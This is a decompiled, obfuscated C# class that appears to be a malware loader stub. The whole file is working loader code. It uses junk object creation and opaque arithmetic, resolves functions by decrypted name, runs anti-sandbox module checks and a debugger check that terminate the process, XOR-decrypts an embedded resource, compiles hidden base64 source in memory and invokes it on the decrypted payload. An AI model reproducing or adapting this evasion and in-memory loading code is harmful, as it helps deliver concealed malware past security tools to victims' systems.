using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Ports;
using System.Management;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.CSharp;

public class YwNOaUakClxU
{
	private delegate IntPtr EL(string cL);

	private delegate bool kL(IntPtr gL, ref bool GL);

	private delegate bool RL(IntPtr LL, UIntPtr mL, uint ML, out uint nL);

	private static IntPtr sL;

	[DllImport("kernel32")]
	private static extern IntPtr GetProcAddress(IntPtr SL, string tL);

	[DllImport("kernel32")]
	private static extern IntPtr LoadLibrary(string uL);

	private unsafe static void vL()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0211: Unknown result type (might be due to invalid IL or missing references)
		//IL_0240: Unknown result type (might be due to invalid IL or missing references)
		//IL_0246: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0252: Unknown result type (might be due to invalid IL or missing references)
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		//IL_0270: Unknown result type (might be due to invalid IL or missing references)
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0282: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_046f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0475: Unknown result type (might be due to invalid IL or missing references)
		//IL_0487: Unknown result type (might be due to invalid IL or missing references)
		//IL_048d: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_0507: Unknown result type (might be due to invalid IL or missing references)
		//IL_0532: Unknown result type (might be due to invalid IL or missing references)
		//IL_0547: Unknown result type (might be due to invalid IL or missing references)
		//IL_054d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0553: Unknown result type (might be due to invalid IL or missing references)
		//IL_058c: Unknown result type (might be due to invalid IL or missing references)
		//IL_05eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0619: Unknown result type (might be due to invalid IL or missing references)
		//IL_061f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0625: Unknown result type (might be due to invalid IL or missing references)
		//IL_066e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0680: Unknown result type (might be due to invalid IL or missing references)
		//IL_0695: Unknown result type (might be due to invalid IL or missing references)
		//IL_069b: Unknown result type (might be due to invalid IL or missing references)
		//IL_06a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0808: Unknown result type (might be due to invalid IL or missing references)
		//IL_080e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0991: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a96: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ab5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b08: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b2d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b33: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b4b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b51: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b57: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b5d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b63: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b6f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b83: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b89: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b95: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ba7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d04: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d0a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d10: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d25: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d31: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d8c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d92: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d98: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dc9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0de1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0df5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dfc: Expected O, but got Unknown
		//IL_0f0d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f13: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f25: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f61: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f79: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f93: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f99: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fc0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fde: Unknown result type (might be due to invalid IL or missing references)
		//IL_1003: Unknown result type (might be due to invalid IL or missing references)
		//IL_104c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1052: Unknown result type (might be due to invalid IL or missing references)
		//IL_1058: Unknown result type (might be due to invalid IL or missing references)
		//IL_1172: Unknown result type (might be due to invalid IL or missing references)
		new ManagementObject();
		new Stack<char>();
		new EventLog();
		new Ping();
		new SerialPort();
		new Stack<float>();
		new ManagementClass();
		new PerformanceCounter();
		new ManagementObjectSearcher();
		new ManagementClass();
		sL = LoadLibrary(_003CModule_003E.tl((string)_003CModule_003E.xl()));
		new Stack<int>();
		new EventLog();
		new ManagementEventWatcher();
		new ProcessStartInfo();
		new FileSystemWatcher();
		_ = (RL)Marshal.GetDelegateForFunctionPointer(GetProcAddress(sL, _003CModule_003E.tl((string)_003CModule_003E.Xl())), typeof(RL));
		new ProcessStartInfo();
		new Stack<double>();
		string text = _003CModule_003E.tl((string)_003CModule_003E.yl());
		int num = Convert.ToInt32(-7.0);
		if ((Convert.ToInt32(12972.0 - Math.Tanh(6485.5)) ^ Convert.ToInt32(4848.0)) == Convert.ToInt32(8283.0))
		{
			Convert.ToInt32(1.0 + Math.Truncate(1.0));
			num += sizeof(double);
		}
		string[] array = new string[num];
		int num2 = Convert.ToInt32(-8.0);
		if ((Convert.ToInt32(5828.0) ^ Convert.ToInt32(4981.995163979017 + Math.Tan(2490.5))) == Convert.ToInt32(1459.862429556106 - Math.Log10(728.5)))
		{
			Convert.ToInt32(2.0);
			num2 += sizeof(double);
		}
		array[num2] = _003CModule_003E.tl((string)_003CModule_003E.Yl());
		int num3 = Convert.ToInt32(-8.0);
		if ((Convert.ToInt32(7357.4340931779325 + Math.Log10(3680.5)) ^ Convert.ToInt32(3632.0)) == Convert.ToInt32(4850.0 - Math.Tanh(2424.5)))
		{
			Convert.ToInt32(2.761594155955765 - Math.Tanh(1.0));
			num3 += sizeof(double);
		}
		string[] array2 = text.Split(array, (StringSplitOptions)num3);
		new Random();
		new Process();
		new EventLog();
		EL eL = (EL)Marshal.GetDelegateForFunctionPointer(GetProcAddress(sL, _003CModule_003E.tl((string)_003CModule_003E.zl())), typeof(EL));
		new ManagementObject();
		new ManagementObject();
		new EventLog();
		new ManagementClass();
		new ManagementObject();
		new Process();
		new FileSystemWatcher();
		new FileSystemWatcher();
		new SerialPort();
		new ManagementClass();
		new FileSystemWatcher();
		new PerformanceCounter();
		string[] array3 = array2;
		int num4 = Convert.ToInt32(-8.0);
		if ((Convert.ToInt32(8071.0 + Math.Ceiling(8071.5)) ^ Convert.ToInt32(8841.297334788507 - Math.Sin(4421.0))) == Convert.ToInt32(3779.0 + Math.Floor(3778.5)))
		{
			Convert.ToInt32(2.761594155955765 - Math.Tanh(1.0));
			num4 += sizeof(double);
		}
		int num5 = num4;
		while (num5 < array3.Length)
		{
			string cL = array3[num5];
			if (eL(cL).ToInt32() != 0)
			{
				VL();
			}
			int num6 = num5;
			int num7 = Convert.ToInt32(-7.0);
			if ((Convert.ToInt32(15158.0 + Math.Tanh(7579.5)) ^ Convert.ToInt32(9114.574593204214 + Math.Log(4561.5))) == Convert.ToInt32(6292.953834168169 + Math.Sin(3146.0)))
			{
				Convert.ToInt32(1.4596976941318602 + Math.Cos(1.0));
				num7 += sizeof(double);
			}
			num5 = num6 + num7;
		}
		new SerialPort();
		byte[] array4 = new byte[Convert.ToInt32(468018.0)];
		new ManagementObject();
		new ManagementEventWatcher();
		try
		{
			Array.Reverse((Array)array4);
		}
		catch
		{
		}
		new ManagementEventWatcher();
		new Process();
		int num8 = Convert.ToInt32(-8.0);
		if ((Convert.ToInt32(639.0 + Math.Tanh(320.0)) ^ Convert.ToInt32(5873.0)) == Convert.ToInt32(5233.0))
		{
			Convert.ToInt32(2.0 - Math.Log10(1.0));
			num8 += sizeof(double);
		}
		bool GL = (byte)num8 != 0;
		new ManagementEventWatcher();
		new SerialPort();
		new Random();
		new ProcessStartInfo();
		new SerialPort();
		new EventLog();
		new List<char>();
		new Stack<uint>();
		new Stack<char>();
		kL kL = (kL)Marshal.GetDelegateForFunctionPointer(GetProcAddress(sL, _003CModule_003E.tl((string)_003CModule_003E.Zl())), typeof(kL));
		new List<uint>();
		new PerformanceCounter();
		new List<ulong>();
		new EventLog();
		new ManagementObjectSearcher();
		new SerialPort();
		kL(Process.GetCurrentProcess().Handle, ref GL);
		new SerialPort();
		new Random();
		uint num9 = (uint)Convert.ToInt32(277565.0 + Math.Round(277565.0));
		new ManagementObjectSearcher();
		num9 += (uint)Convert.ToInt32(544306.0);
		new ManagementObject();
		new PerformanceCounter();
		new PerformanceCounter();
		if (GL)
		{
			VL();
		}
		byte[] array5 = new byte[Convert.ToInt32(992926.967777751 + Math.Cos(496463.0))];
		new Process();
		new ManagementEventWatcher();
		uint num10 = (uint)Convert.ToInt32(460665.0 + Math.Round(460665.5));
		new Stack<ulong>();
		num10 += (uint)Convert.ToInt32(323573.0 + Math.Truncate(323572.5));
		try
		{
			Array.Reverse((Array)array5);
		}
		catch
		{
		}
		new List<ulong>();
		new ManagementObject();
		new Random();
		new ProcessStartInfo();
		new ManagementObjectSearcher();
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(_003CModule_003E.tl((string)_003CModule_003E.smethod_0()));
		new PerformanceCounter();
		new ManagementObject();
		new ManagementObjectSearcher();
		long num11 = Convert.ToInt32(128865.99998503302 + Math.Sin(64432.5));
		num11 += Convert.ToInt32(99288.0 + Math.Truncate(99288.0));
		new PerformanceCounter();
		new Stack<long>();
		new Random();
		new ManagementObjectSearcher();
		byte[] array6 = new byte[manifestResourceStream.Length];
		new SerialPort();
		new ManagementObjectSearcher();
		new SerialPort();
		new Ping();
		new Process();
		new Ping();
		long num12 = Convert.ToInt32(424124.0 + Math.Floor(424123.5));
		new PerformanceCounter();
		new Random();
		new PerformanceCounter();
		new Process();
		new ManagementClass();
		num12 += Convert.ToInt32(536921.0);
		int num13 = Convert.ToInt32(-8.0);
		if ((Convert.ToInt32(526.07653576993 + Math.Cos(263.5)) ^ Convert.ToInt32(8843.287542445913 + Math.Cos(4421.5))) == Convert.ToInt32(8332.333751006954 - Math.Log(4162.0)))
		{
			Convert.ToInt32(1.0 + Math.Truncate(1.0));
			num13 += sizeof(double);
		}
		manifestResourceStream.Read(array6, num13, array6.Length);
		new Ping();
		new FileSystemWatcher();
		new FileSystemWatcher();
		new Stack<ulong>();
		new List<long>();
		manifestResourceStream.Close();
		byte[] bytes = Encoding.UTF8.GetBytes(_003CModule_003E.tl((string)_003CModule_003E.smethod_1()));
		new ManagementObject();
		new ProcessStartInfo();
		new Random();
		new Random();
		byte[] array7 = new byte[array6.Length];
		string text2 = _003CModule_003E.tl((string)_003CModule_003E.smethod_2());
		new ManagementObject();
		new ManagementClass();
		new Ping();
		Console.WriteLine(text2);
		string[] array8 = new string[Convert.ToInt32(6.58113883008419 - Math.Sqrt(2.5))];
		int num14 = Convert.ToInt32(-8.0);
		if ((Convert.ToInt32(251.0) ^ Convert.ToInt32(8896.0 - Math.Tanh(4447.5))) == Convert.ToInt32(8771.056135290926 + Math.Cos(4386.0)))
		{
			num14 += sizeof(double);
		}
		array8[num14] = text2;
		int num15 = Convert.ToInt32(-7.0);
		if ((Convert.ToInt32(3248.0 + Math.Floor(3247.5)) ^ Convert.ToInt32(2932.0)) == Convert.ToInt32(4602.776561715282 + Math.Sqrt(2325.5)))
		{
			Convert.ToInt32(1.0 + Math.Abs(1.0));
			num15 += sizeof(double);
		}
		array8[num15] = text2;
		array8[Convert.ToInt32(2.5403023058681398 - Math.Cos(1.0))] = text2;
		array8[Convert.ToInt32(2.0 + Math.Floor(1.5))] = text2;
		array8[Convert.ToInt32(3.090702573174318 + Math.Sin(2.0))] = text2;
		string.Concat(array8);
		new ProcessStartInfo();
		new SerialPort();
		new ProcessStartInfo();
		int num16 = Convert.ToInt32(-8.0);
		if ((0x570 ^ Convert.ToInt32(10773.0 - Math.Floor(3591.0))) == Convert.ToInt32(6526.0))
		{
			Convert.ToInt32(2.0);
			num16 += sizeof(double);
		}
		int num17 = num16;
		while (num17 < array6.Length)
		{
			array7[num17] = (byte)(array6[num17] ^ bytes[num17 % bytes.Length]);
			int num18 = num17;
			int num19 = -7;
			if ((Convert.ToInt32(1497.6140551342048 - Math.Log(745.5)) ^ Convert.ToInt32(2184.0220642233353 - Math.Tan(1092.5))) == Convert.ToInt32(3425.4436636831156 - Math.Log(1709.0)))
			{
				Convert.ToInt32(2.0 - Math.Log(1.0));
				num19 += sizeof(double);
			}
			num17 = num18 + num19;
		}
		new ManagementObject();
		new ProcessStartInfo();
		new Process();
		ulong num20 = (ulong)Convert.ToInt32(838929.0);
		new EventLog();
		new Process();
		new Ping();
		new FileSystemWatcher();
		num20 += (ulong)Convert.ToInt32(1239.5654534812124 + Math.Log(623.0));
		new Process();
		new SerialPort();
		Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
		new EventLog();
		string value = _003CModule_003E.tl((string)_003CModule_003E.smethod_3());
		new PerformanceCounter();
		Console.WriteLine(value);
		new List<float>();
		new ManagementObject();
		new SerialPort();
		string value2 = _003CModule_003E.tl((string)_003CModule_003E.smethod_4());
		new Stack<char>();
		new ManagementObjectSearcher();
		new ManagementObject();
		new ManagementEventWatcher();
		new ManagementEventWatcher();
		new EventLog();
		new ProcessStartInfo();
		new ManagementObjectSearcher();
		Console.WriteLine(value2);
		List<string> list = new List<string>();
		new ManagementEventWatcher();
		new SerialPort();
		new Random();
		new PerformanceCounter();
		new ManagementClass();
		new Random();
		new ManagementClass();
		new Ping();
		new List<long>();
		Assembly[] array9 = assemblies;
		int num21 = Convert.ToInt32(-8.0);
		if ((Convert.ToInt32(1822.959041392321 - Math.Log10(910.0)) ^ Convert.ToInt32(7260.074972661557 - Math.Sin(3630.5))) == Convert.ToInt32(6977.971659923833 - Math.Sin(3488.5)))
		{
			Convert.ToInt32(3.5574077246549023 - Math.Tan(1.0));
			num21 += sizeof(double);
		}
		int num22 = num21;
		while (num22 < array9.Length)
		{
			Assembly assembly = array9[num22];
			if (!assembly.IsDynamic)
			{
				list.Add(assembly.Location);
			}
			int num23 = num22;
			int num24 = Convert.ToInt32(-7.0);
			if ((Convert.ToInt32(2940.0 + Math.Truncate(2939.5)) ^ Convert.ToInt32(1480.0 + Math.Floor(1479.5))) == Convert.ToInt32(3772.0 + Math.Truncate(3772.0)))
			{
				Convert.ToInt32(1.4596976941318602 + Math.Cos(1.0));
				num24 += sizeof(double);
			}
			num22 = num23 + num24;
		}
		new ManagementClass();
		new ManagementObjectSearcher();
		new ManagementObject();
		string[] array10 = list.ToArray();
		new ProcessStartInfo();
		new SerialPort();
		new ManagementClass();
		new ManagementObjectSearcher();
		new List<char>();
		byte[] array11 = new byte[Convert.ToInt32(419353.0 + Math.Abs(419353.0))];
		new Random();
		try
		{
			Array.Reverse((Array)array11);
		}
		catch
		{
		}
		string text3 = _003CModule_003E.tl((string)_003CModule_003E.smethod_5());
		Console.WriteLine(text3);
		new Random();
		new EventLog();
		new PerformanceCounter();
		new PerformanceCounter();
		text3 += Convert.ToInt32(757812.0 + Math.Tanh(378906.5));
		ICodeCompiler val = ((CodeDomProvider)new CSharpCodeProvider()).CreateCompiler();
		new ManagementEventWatcher();
		new List<ulong>();
		new PerformanceCounter();
		new List<char>();
		new List<char>();
		CompilerParameters val2 = new CompilerParameters(array10);
		int num25 = Convert.ToInt32(-7.0);
		if ((Convert.ToInt32(6763.0 + Math.Ceiling(6763.0)) ^ Convert.ToInt32(4339.0 - Math.Tanh(2169.0))) == Convert.ToInt32(9320.014704292527 - Math.Sqrt(4626.0)))
		{
			Convert.ToInt32(2.0 + Math.Log10(1.0));
			num25 += sizeof(double);
		}
		val2.set_GenerateInMemory((byte)num25 != 0);
		int num26 = Convert.ToInt32(-8.0);
		if ((Convert.ToInt32(14616.0) ^ Convert.ToInt32(11511.0 - Math.Ceiling(3837.0))) == Convert.ToInt32(14163.0 - Math.Abs(4721.0)))
		{
			Convert.ToInt32(3.5574077246549023 - Math.Tan(1.0));
			num26 += sizeof(double);
		}
		val2.set_GenerateExecutable((byte)num26 != 0);
		CompilerParameters val3 = val2;
		new PerformanceCounter();
		new ManagementObject();
		new Random();
		new List<ulong>();
		new ManagementClass();
		CompilerResults val4 = val.CompileAssemblyFromSource(val3, Encoding.UTF8.GetString(Convert.FromBase64String(_003CModule_003E.tl((string)_003CModule_003E.smethod_6()))));
		new Stack<int>();
		new ProcessStartInfo();
		new ManagementObject();
		new ManagementObject();
		new Process();
		string text4 = _003CModule_003E.tl((string)_003CModule_003E.smethod_7());
		new EventLog();
		new ProcessStartInfo();
		_ = text4 + text4 + text4 + text4;
		new SerialPort();
		new ManagementObject();
		new ManagementObject();
		new Stack<uint>();
		new Ping();
		Assembly compiledAssembly = val4.get_CompiledAssembly();
		new ProcessStartInfo();
		new ManagementObjectSearcher();
		new Random();
		new ProcessStartInfo();
		new ManagementClass();
		new ProcessStartInfo();
		new ManagementObjectSearcher();
		Type type = compiledAssembly.GetType(_003CModule_003E.tl((string)_003CModule_003E.smethod_8()));
		new Random();
		new List<uint>();
		new ManagementObjectSearcher();
		new FileSystemWatcher();
		new Random();
		new Stack<long>();
		new Process();
		new Process();
		new Stack<int>();
		MethodInfo method = type.GetMethod(_003CModule_003E.tl((string)_003CModule_003E.smethod_9()));
		string text5 = _003CModule_003E.tl((string)_003CModule_003E.aL());
		new PerformanceCounter();
		new EventLog();
		new ManagementObject();
		string text6 = _003CModule_003E.tl((string)_003CModule_003E.AL());
		new Random();
		new Ping();
		_ = text5 + text5 + text6 + text6;
		int num27 = Convert.ToInt32(-7.0);
		if ((Convert.ToInt32(10610.544609631845 + Math.Tan(5307.5)) ^ Convert.ToInt32(9416.948157675582 - Math.Sin(4708.0))) == Convert.ToInt32(3519.0))
		{
			Convert.ToInt32(1.1585290151921035 + Math.Sin(1.0));
			num27 += sizeof(double);
		}
		object[] array12 = new object[num27];
		int num28 = -8;
		if ((Convert.ToInt32(7092.0) ^ Convert.ToInt32(2436.0)) == Convert.ToInt32(6984.0 - Math.Truncate(2328.0)))
		{
			Convert.ToInt32(2.0 + Math.Log10(1.0));
			num28 += sizeof(double);
		}
		array12[num28] = array7;
		method.Invoke(null, array12);
		new Ping();
		new ManagementEventWatcher();
		new Stack<float>();
		new Process();
		new List<double>();
	}

	private unsafe static void VL()
	{
		try
		{
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			int num = Convert.ToInt32(-3125.0);
			if ((Convert.ToInt32(138580.51945043323 + Math.Sqrt(69422.0)) ^ Convert.ToInt32(626115.0)) == Convert.ToInt32(758687.0))
			{
				Convert.ToInt32(3.0 - Math.Floor(1.0));
				num = num + sizeof(double) + Convert.ToInt32(1558.0 + Math.Ceiling(1558.5));
			}
			Environment.Exit(num);
		}
	}
}
